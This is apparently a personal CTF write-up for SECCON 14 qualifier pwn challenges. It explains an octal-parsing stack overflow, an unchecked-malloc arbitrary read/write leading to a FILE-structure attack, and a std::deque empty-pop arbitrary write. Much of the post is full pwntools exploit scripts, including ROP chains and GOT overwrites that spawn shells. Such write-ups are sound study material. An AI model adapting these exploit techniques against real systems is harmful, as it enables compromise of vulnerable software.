---
date: 2025-12-13 10:31:59
layout: post
title: SECCON 14 Quals Writeup
subtitle: 
description: >-
    8th with blue-lotus!
image: >-
  /assets/img/uploads/saudi_cat.jpg
optimized_image: >-
  /assets/img/uploads/saudi_cat.jpg
category: ctf
tags:
  - 
author: rosayxy
paginate: true
---
This SECCON 14 quals was done with blue-lotus team. We got 8th place!

## Unserialize

Completed with dylanyang17.

The vulnerability is a classic atoi/strtoul inconsistency bug. The length string is parsed with atoi (base 10) while the allocation size is parsed with strtoul (base 8). Therefore, if we send a length string starting with '0', it will be interpreted as octal by strtoul, causing a smaller allocation than intended. Therefore, we can overflow the stack via alloca.

Part of the stack layout and code is like this

```c
char tmp_buf_0[8]; // [rsp+8h] [rbp-70h] BYREF
unsigned __int64 size_1; // [rsp+10h] [rbp-68h]
__int64 buf_1; // [rsp+18h] [rbp-60h]

for ( j = 0; j < sz; ++j )
  {
    if ( (unsigned int)_isoc99_fscanf(
                         fp_1,
                         (unsigned int)"%02hhx",
                         (int)j + (int)tmp_buf,
                         (unsigned int)"%02hhx",
                         v6,
                         v7,
                         tmp_buf_0[0]) != 1 )
      return -1;
  }

  j_memcpy(buf_1, tmp_buf, sz);

```

We overwrite the lowest byte of the destination of memcpy(buf_1 in the code above) to bypass the canary and overwrite the return address to a ROP chain.

This exploit script is produced by dylanyang17. Will try to reconstruct it later.

### exp
```py
from pwn import *

# Simple PoC for the unserialize length/alloca bug.
# It sends a crafted length string that is interpreted differently
# by atoi/strtoul(base=10) vs strtoul(base=0), causing a stack overflow.

context.binary = ELF("./chall", checksec=False)
context.log_level = "debug"  # change to "info" or "error" if too noisy


LEN_DEC = 113
LEN_STR = f"0{LEN_DEC}"  # "0256"

assert LEN_STR.isdigit() and LEN_STR[0] == "0"

# Build the body: 100 bytes of 'A' to clearly smash the stack
pop_rax_ret = 0x004303ab
pop_rdi_rbp_ret = 0x0402418
syscall = 0x042849F
pop_rsi_ret = 0x43617e
pop_rdx_ret = 0x04866ec # 0x00000000004866ec : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
store = 0x42F785 # mov [rsi], rax ; ret
binshell = 0x04CCC60

rop = p64(pop_rax_ret) + p64(0x68732f6e69622f) + p64(pop_rsi_ret) + p64(binshell) + p64(store) + p64(pop_rdi_rbp_ret) + p64(binshell) + p64(0) + p64(pop_rsi_ret) + p64(0) + p64(pop_rax_ret) + p64(59) + p64(syscall)
# c: 1 e: 2 6: 2 d: 1 4: 1 a: 1
body = rop.ljust(0x70, b"\x00") + p8(0x78)
body_hex = body.hex()

# The program expects: "<len_dec_digits>:<len bytes as %02hhx>"
prefix = (LEN_STR + ":").encode()
payload = prefix + body_hex.encode()


def start_io(local=True, host=None, port=None):
    if local:
        return process(context.binary.path)
    assert host is not None and port is not None
    return remote(host, port)


def main():
    # Set local=False and fill host/port to hit remote
    io = start_io(local=True)

    # Send the serialized blob; no extra newline required but harmless
    io.send(payload + b"\n")

    # With this PoC you should see a crash (SIGSEGV) due to
    # stack corruption from the alloca overflow.
    io.interactive()


if __name__ == "__main__":
    main()

```

## gachi array

The classic interger overflow. Also malloc without the return value check and index check leads to arbitrary read/write.

### vuln

The array's init function is like this:

```c
void array_init(pkt_t *pkt) {
  if (pkt->size > pkt->capacity)
    pkt->size = pkt->capacity;

  g_array.data = (int*)malloc(pkt->capacity * sizeof(int));
  if (!g_array.data)
    *(uint64_t*)pkt = 0; // this is where pkt->capacity locates

  g_array.size = pkt->size;
  g_array.capacity = pkt->capacity;
  g_array.initial = pkt->initial;

  for (size_t i = 0; i < pkt->size; i++)
    g_array.data[i] = pkt->initial;

  printf("Initialized: size=%d capacity=%d\n", pkt->size, pkt->size);
}
```

If the allocation failed (`g_array.data == NULL`), according to the source code, the capacity should be set to zero by `*(uint64_t*)pkt = 0`.

However, when looking at the decompiled code, part of it looks like this:

```c
  v1 = *pkt; // both pkt->size and pkt->capacity are read to v1
  if ( pkt[1] > *pkt )
    pkt[1] = v1;
  data = (__int64)malloc(4LL * v1);
  data_1 = (__m128i *)data;
  if ( !data )
    *(_QWORD *)pkt = 0;
  size = pkt[1];
  initial = pkt[2];
  initial_1 = initial;
  g_array = _mm_unpacklo_epi32(_mm_cvtsi32_si128(size), _mm_cvtsi32_si128(v1)).m128i_u64[0]; // original pkt->capacity copied to g_array
```

We can easily see that EVEN IF malloc fails, the size will be set to 0 but **capacity is still set to the user controlled value of the initial `pkt->capacity`**. This means we can set a very large capacity, make malloc fail, and then assign the `g_array.capacity` to a very big number.

```py
p.send(p32(0xffffffff) + p32(3) + p32(0))
```

such is the poc to achieve this.

From past challenges, we know that if we have unchecked malloc and index, we can achieve arbitrary read/write. See the [bph writeup](https://blog.rosay.xyz/qwb-2025-writeup/) here.

Therefore, to get this unchecked index, we should use the resize functionality to set size to a very large number (negative number interpreted as a large unsigned number).

```py
p.send(p32(0xffffffff) + p32(3) + p32(0))
p.recvuntil(b'Initialized')
op(3, -2, 0x1337)
p.recvuntil("New size set to -2\n")
```

After having arbitrary read/write, we can leak libc and do the classic _IO_file structure attack of house of apple 2.

Leaking from the stdin structure:

```py
op(1, 0x0404050//4, 0)
p.recvuntil("array[1052692] = ")
libc_leak_lower = int(p.recvline().strip())
if libc_leak_lower < 0:
    libc_leak_lower += 2**32
op(1, 0x0404050//4 + 1, 0)
p.recvuntil("array[1052693] = ")
libc_leak_upper = int(p.recvline().strip())

libc_leak = (libc_leak_upper << 32) | libc_leak_lower
log.info(f"libc leak: {hex(libc_leak)}")
libc_base = libc_leak - libc.symbols["_IO_2_1_stdin_"]
log.info(f"libc base: {hex(libc_base)}")

```

Finally, we exploit using house of apple 2 and it is done.

### exp

```py
from pwn import *
context(log_level='debug', arch='amd64', os='linux')
# p = process("./chall")
p = remote("gachiarray.seccon.games", 5000)
libc = ELF("./libc.so.6")

def op(opcode, idx, val):
    if idx < 0:
        idx += 2**32
    if val < 0:
        val += 2**32
    p.send(p32(opcode) + p32(idx) + p32(val))

# init
# gdb.attach(p)
# pause()
p.send(p32(0xffffffff) + p32(3) + p32(0))
p.recvuntil(b'Initialized')
op(3, -2, 0x1337)
p.recvuntil("New size set to -2\n")
op(1, 0x0404050//4, 0)
p.recvuntil("array[1052692] = ")
libc_leak_lower = int(p.recvline().strip())
if libc_leak_lower < 0:
    libc_leak_lower += 2**32
op(1, 0x0404050//4 + 1, 0)
p.recvuntil("array[1052693] = ")
libc_leak_upper = int(p.recvline().strip())

libc_leak = (libc_leak_upper << 32) | libc_leak_lower
log.info(f"libc leak: {hex(libc_leak)}")
libc_base = libc_leak - libc.symbols["_IO_2_1_stdin_"]
log.info(f"libc base: {hex(libc_base)}")

io_list_all = libc_base + libc.symbols["_IO_list_all"]

# set the fake io_file
fake_io_addr = 0x00404090

system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x205700)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)

# write to fake_io_addr

for i in range(len(fake_io_file)//4):
    log.info("fake_io_file[i*4:i*4+4]: " + hex(u32(fake_io_file[i*4:i*4+4])))
    op(2, (fake_io_addr//4) + i, u32(fake_io_file[i*4:i*4+4]))
    p.recvuntil("array")


# edit data
op(2, 0x0404080//4 + 1, io_list_all//0x100000000)
p.recvuntil("array")
op(2, (io_list_all)%0x100000000//4, fake_io_addr)
p.recvuntil("array")
op(2, (io_list_all)%0x100000000//4 + 1, 0)
p.recvuntil("array")

# trigger
op(4, 0, 0)
p.interactive()
```

## Cursed Stack

Was doing this chal in my dorm and I was frustrated so I mumbled "Cursed" a bit two loudly. Then my roomates looked at me and said something like "Okay, we get it". LOL. Love staying with my sweetest roomates <3.

Did this cursed chal with dylanyang17 and jiegec.

### Initial primitive

The vulnerability is an "empty pop" of the stack, which is implemented in std::deque. By popping from an empty stack, we can trigger unintended behavior and all sort of stuffs.

```c
while (std::cin.good()) {
    std::cin >> op;
    if (op == 1) {
      std::cin >> val;
      S.push(val);
    } else if (op == 2) {
      S.pop();
    } else if (op == 3) {
      std::cin >> val;
      T.push(val);
    } else if (op == 4) {
      T.pop();
    } else {
      break;
    }
  }
```

### getting a primitive THAT WORKS

In a privious challenge [calc](https://blog.rosay.xyz/blackhat-mea-2025-writeup-pwn/) we can easily get heap underflow using the std::vector's empty pop. However, if we try the same thing here, it will dereference from a very low address (about 0x1f8 or such) and crash.

```py
pop(p, 2)
pop(p, 2)
pop(p, 2)
push(p, 1, 0xdeadbeef)
```

To understand why, we need to look at the implementation of std::deque. Found a good resource [here](https://zhuanlan.zhihu.com/p/494261593).

To make it brief, the std::deque is implemented as a list of fixed-size arrays (called nodes). The deque maintains a map (an array of pointers) that points to these nodes. Each node can hold a certain number of elements (64 in this case).

I used claude to help me recover the structure of std::deque in this binary:

```c

template<typename T>
class deque {
    // Base class members
    T** _M_map;              // offset +0:  pointer to map (array of chunk pointers)
    size_t _M_map_size;      // offset +8:  size of the map array
    
    // Start iterator (offset +16 to +39, 24 bytes total)
    struct {
        T* _M_cur;           // offset +16: current element pointer
        T* _M_first;         // offset +24: start of chunk
        T* _M_last;          // offset +32: end of chunk
        T** _M_node;         // offset +40: pointer to map entry
    } _M_start;
    
    // Finish iterator (offset +48 to +71, 24 bytes total)
    struct {
        T* _M_cur;           // offset +48: current element pointer (end)
        T* _M_first;         // offset +56: start of chunk
        T* _M_last;          // offset +64: end of chunk
        T** _M_node;         // offset +72: pointer to map entry
    } _M_finish;
};

```

Below is the analysis of what happens when we pop from an empty deque:
```c
__int64 __fastcall std::deque<unsigned long>::_M_pop_back_aux(_QWORD *a1)
{
  __int64 v2; // [rsp+18h] [rbp-28h]

  std::_Deque_base<unsigned long>::_M_deallocate_node(a1, a1[7]);
  std::_Deque_iterator<unsigned long,unsigned long &,unsigned long *>::_M_set_node(a1 + 6, a1[9] - 8LL);
  a1[6] = a1[8] - 8LL;
  v2 = a1[6];
  ident_1(a1);
  return v2;
}
```
For the map, it deallocates the current node (chunk), then moves the finish iterator to the previous node in the map, and updates the current pointer accordingly. There is no check to see the previous node's validity.

In the previous pop thrice push once example, after calling the _M_pop_back_aux, the previous node pointer is nullptr, so the current pointer becomes nullptr + offset, which is an invalid address and causes a crash when we try to push.

Emmmm... How can we turn this into a useful primitive?

There is one thing we noticed: The first node pointer is always at the center of the map, making it more space-friendly for both front and back pushes/pops. Also, during reallocation of the map, the chunk is not zeroed. This means that if we can reallocate the map to a larger size, and we can control the remaining content of where it allocated to, we can make the previous node pointer point to a controlled address. This idea is proposed by dylanyang17. tql!

With this condition, we first constructs a very large string made of repeated target addresses. When the string length is large enough, there will be a reallocation during construction of the string. Therefore, we can get a big enough unsorted bin chunk with the content we control.

Then we push enough times to trigger a map reallocation in std::deque. During the reallocation, the new map will alloc a chunk from our unsorted bin, and thus the previous node pointer will point to our controlled address. **When we do an empty pop, the current pointer will be set to our controlled address + offset.**

When we push again, we can write to something like our controlled address + offset. With this, we can have an **arbitrary write primitive**.


Here's the PoC. The times to trigger the map's reallocation is calculated by GPT 5.1.

```py
from pwn import *

context(log_level="debug", arch="amd64", os="linux")

target_addr = 0x0405008
def start():
    """Start the target process."""
    return process("./st")


def handshake(p):
    """Send the initial name prompt."""
    p.recvuntil(b"What's your name?\n")
    p.sendline(p64(target_addr)*0x800)
    p.recvuntil(b"!\n")


def push(p, which, val):
    """Push `val` onto stack S or T.

    which = 1 -> push S
    which = 3 -> push T
    """
    assert which in (1, 3)
    p.sendline(str(which).encode())
    p.sendline(str(val).encode())


def pop(p, which):
    """Pop from stack S or T.

    which = 2 -> pop S
    which = 4 -> pop T
    """
    assert which in (2, 4)
    p.sendline(str(which).encode())


def trigger_map_realloc():
    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.

    For std::deque<unsigned long> in this binary:
      - Each node holds 64 elements.
      - Initial _M_map_size = 8, with a single node centered at map[3].
      - On every 64th push, when a node is full, push_back() calls
        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
      - While finish._M_node is at indices 3..6, there are enough map
        slots at the back, so no reallocation occurs.
      - When finish._M_node reaches index 7 and we try to create one more
        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
        (the current node) and calls _M_reallocate_map(), which in turn
        calls _M_allocate_map() with a larger map size.

    To get there starting from an empty deque we need 5 node-boundary
    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
    64th push for that node. So approximately 64 * 5 = 320 pushes on S
    are enough to force a map reallocation.
    """

    p = start()
    handshake(p)

    log.info("Pushing enough elements on S to trigger map reallocation...")

    # Push on S (op=1) enough times so that the 5th node transition
    # forces _M_reserve_map_at_back to grow the map.

    total_pushes = 64 * 5
    for i in range(total_pushes):
        push(p, 1, i)


    for i in range(total_pushes + 64):
        pop(p, 2)
    push(p, 1, 0xdeadbeef)
    gdb.attach(p)
    pause()
    # Keep the process alive so you can inspect it.
    p.interactive()


if __name__ == "__main__":
    trigger_map_realloc()
```

It has the following effect:

![alt_text](/assets/img/uploads/arb_write.webp)

Thus, we have an arbitrary write primitive!

### further exploitation

I tried overwriting the operator delete got to system. Then when we free a chunk with "/bin/sh", we can get a shell. Theoretically it should work with a 1/4096 bruteforce, but it just didn't work for us.

We need a libc leak. Through multiple iterations, jiegec and I came up with a brilliant idea using only two arbitrary write chances.

1. AAW on S to point the `name`'s pointer to somewhere we can leak the libc address. 2. AAW on T to modify `operator delete@got` to 0x4013d5, when we cout << name we can get the libc address 3. After entering main again, pop and push on T to change the operator delete to point to system 4. pop and push on S to change the name's pointer to "/bin/sh" 5. pop on S twice, trigger the operator delete -> system("/bin/sh")

### leak script

```py
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

target_addr = 0x405300

target_addr2 = 0x405040


def start():
    """Start the target process."""
    return process("./st")


def handshake(p):
    """Send the initial name prompt."""
    p.recvuntil(b"What's your name?\n")
    p.sendline(p64(target_addr)*0x20 + p64(target_addr2)*0x7e0)
    p.recvuntil(b"!\n")


def push(p, which, val):
    """Push `val` onto stack S or T.

    which = 1 -> push S
    which = 3 -> push T
    """
    assert which in (1, 3)
    p.sendline(str(which).encode())
    p.sendline(str(val).encode())


def pop(p, which):
    """Pop from stack S or T.

    which = 2 -> pop S
    which = 4 -> pop T
    """
    assert which in (2, 4)
    p.sendline(str(which).encode())


def trigger_map_realloc():
    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.

    For std::deque<unsigned long> in this binary:
      - Each node holds 64 elements.
      - Initial _M_map_size = 8, with a single node centered at map[3].
      - On every 64th push, when a node is full, push_back() calls
        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
      - While finish._M_node is at indices 3..6, there are enough map
        slots at the back, so no reallocation occurs.
      - When finish._M_node reaches index 7 and we try to create one more
        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
        (the current node) and calls _M_reallocate_map(), which in turn
        calls _M_allocate_map() with a larger map size.

    To get there starting from an empty deque we need 5 node-boundary
    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
    64th push for that node. So approximately 64 * 5 = 320 pushes on S
    are enough to force a map reallocation.
    """

    p = start()
    handshake(p)

    log.info("Pushing enough elements on S to trigger map reallocation...")

    # Push on S (op=1) enough times so that the 5th node transition
    # forces _M_reserve_map_at_back to grow the map.

    total_pushes = 64 * 5

    for i in range(total_pushes):
        push(p, 1, i)

    for i in range(total_pushes):
        push(p, 3, i)

    for i in range(total_pushes + 64):
        pop(p, 2)


    push(p, 1, 0x405078)
    push(p, 1, 0x10)
    
    for i in range(total_pushes + 64):
        pop(p, 4)
    push(p, 3, 0x04013d5)
    # gdb.attach(p)
    # pause()
    pop(p, 4)
    pop(p, 4)
    # Keep the process alive so you can inspect it.
    p.interactive()


if __name__ == "__main__":
    trigger_map_realloc()
```


### exp

The script below can work in local and docker but not remote.

```py

from pwn import *

context(arch="amd64", os="linux", log_level="debug")

target_addr = 0x405300

target_addr2 = 0x405040

libc = ELF("./libc.so.6")
def start():
    """Start the target process."""
    return process("./st")


def handshake(p):
    """Send the initial name prompt."""
    p.recvuntil(b"What's your name?\n")
    p.sendline(p64(target_addr)*0x20 + p64(target_addr2)*0x7e0)
    p.recvuntil(b"!\n")


def push(p, which, val):
    """Push `val` onto stack S or T.

    which = 1 -> push S
    which = 3 -> push T
    """
    assert which in (1, 3)
    p.sendline(str(which).encode())
    p.sendline(str(val).encode())


def pop(p, which):
    """Pop from stack S or T.

    which = 2 -> pop S
    which = 4 -> pop T
    """
    assert which in (2, 4)
    p.sendline(str(which).encode())


def trigger_map_realloc():
    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.

    For std::deque<unsigned long> in this binary:
      - Each node holds 64 elements.
      - Initial _M_map_size = 8, with a single node centered at map[3].
      - On every 64th push, when a node is full, push_back() calls
        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
      - While finish._M_node is at indices 3..6, there are enough map
        slots at the back, so no reallocation occurs.
      - When finish._M_node reaches index 7 and we try to create one more
        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
        (the current node) and calls _M_reallocate_map(), which in turn
        calls _M_allocate_map() with a larger map size.

    To get there starting from an empty deque we need 5 node-boundary
    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
    64th push for that node. So approximately 64 * 5 = 320 pushes on S
    are enough to force a map reallocation.
    """

    p = start()
    handshake(p)

    log.info("Pushing enough elements on S to trigger map reallocation...")

    # Push on S (op=1) enough times so that the 5th node transition
    # forces _M_reserve_map_at_back to grow the map.

    total_pushes = 64 * 5

    for i in range(total_pushes):
        push(p, 1, i)

    for i in range(total_pushes):
        push(p, 3, i)

    for i in range(total_pushes + 64):
        pop(p, 2)


    push(p, 1, 0x405078)
    push(p, 1, 0x10)
    
    for i in range(total_pushes + 64):
        pop(p, 4)
    push(p, 3, 0x04013d5)
    # gdb.attach(p)
    # pause()
    pop(p, 4)
    pop(p, 4)
    p.recvuntil("Hello, ")
    libc_leak = u64(p.recv(6).strip().ljust(8, b"\x00"))
    libc_base = libc_leak - 0x188a00

    log.info(f"libc base: {hex(libc_base)}")
    log.info("libc leak: " + hex(libc_leak))

    system = libc_base + 0x00582D2
    push(p, 3, system)

    pop(p, 2)
    pop(p, 2)
    push(p, 1, u64(b"/bin/sh\x00"))
    pop(p, 2)
    pop(p, 2)
    # Keep the process alive so you can inspect it.
    p.interactive()


if __name__ == "__main__":
    trigger_map_realloc()

```

The final script that can work on remote, written by jiegec. The change is to leak the libc address from `__libc_start_main` instead of `memmove@got`:

```py
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

target_addr = 0x405300

target_addr2 = 0x405040

libc = ELF("./libc.so.6")
def start():
    """Start the target process."""
    #return process("./st")
    #return remote("172.17.0.3", 5000)
    #return remote("127.0.0.1", 5001)
    return remote("st.seccon.games", 5000)


def handshake(p):
    """Send the initial name prompt."""
    p.recvuntil(b"What's your name?\n")
    p.sendline(p64(target_addr)*0x20 + p64(target_addr2)*0x7e0)
    p.recvuntil(b"!\n")


def push(p, which, val):
    """Push `val` onto stack S or T.

    which = 1 -> push S
    which = 3 -> push T
    """
    assert which in (1, 3)
    p.sendline(str(which).encode())
    p.sendline(str(val).encode())
    #sleep(0.01)


def pop(p, which):
    """Pop from stack S or T.

    which = 2 -> pop S
    which = 4 -> pop T
    """
    assert which in (2, 4)
    p.sendline(str(which).encode())
    #sleep(0.01)


def trigger_map_realloc():
    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.

    For std::deque<unsigned long> in this binary:
      - Each node holds 64 elements.
      - Initial _M_map_size = 8, with a single node centered at map[3].
      - On every 64th push, when a node is full, push_back() calls
        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
      - While finish._M_node is at indices 3..6, there are enough map
        slots at the back, so no reallocation occurs.
      - When finish._M_node reaches index 7 and we try to create one more
        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
        (the current node) and calls _M_reallocate_map(), which in turn
        calls _M_allocate_map() with a larger map size.

    To get there starting from an empty deque we need 5 node-boundary
    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
    64th push for that node. So approximately 64 * 5 = 320 pushes on S
    are enough to force a map reallocation.
    """

    p = start()
    handshake(p)

    log.info("Pushing enough elements on S to trigger map reallocation...")

    # Push on S (op=1) enough times so that the 5th node transition
    # forces _M_reserve_map_at_back to grow the map.

    total_pushes = 64 * 5

    for i in range(total_pushes):
        push(p, 1, i)

    for i in range(total_pushes):
        push(p, 3, i)

    for i in range(total_pushes + 64):
        pop(p, 2)


    #push(p, 1, 0x405078)
    push(p, 1, 0x404fd8)
    push(p, 1, 0x10)
    
    for i in range(total_pushes + 64):
        pop(p, 4)
    push(p, 3, 0x04013d5)
    # gdb.attach(p)
    # pause()
    pop(p, 4)
    pop(p, 4)
    p.recvuntil(b"Hello, ")
    libc_leak = u64(p.recv(6).strip().ljust(8, b"\x00"))
    #libc_base = libc_leak - 0x188a00
    libc_base = libc_leak - 0x2a200

    log.info(f"libc base: {hex(libc_base)}")
    log.info("libc leak: " + hex(libc_leak))

    system = libc_base + 0x00582D2
    #system = libc_base + libc.symbols["system"]
    #system = libc_base + libc.symbols["puts"]
    print(libc.symbols["system"])
    push(p, 3, system)

    pop(p, 2)
    pop(p, 2)
    push(p, 1, u64(b"/bin/sh\x00"))
    #push(p, 1, u64(b"id\x00\x00\x00\x00\x00\x00"))
    pop(p, 2)
    pop(p, 2)
    # Keep the process alive so you can inspect it.
    p.interactive()


if __name__ == "__main__":
    trigger_map_realloc()
```

## Cursed PQ

What the heck am I supposed to do with heap arbitrary write, no leaks, restricted allocation size(so no house of water), and no partial overwrites. Out of ideas.

Update: Crazyman hinted for using house of muney. Will check on it later.
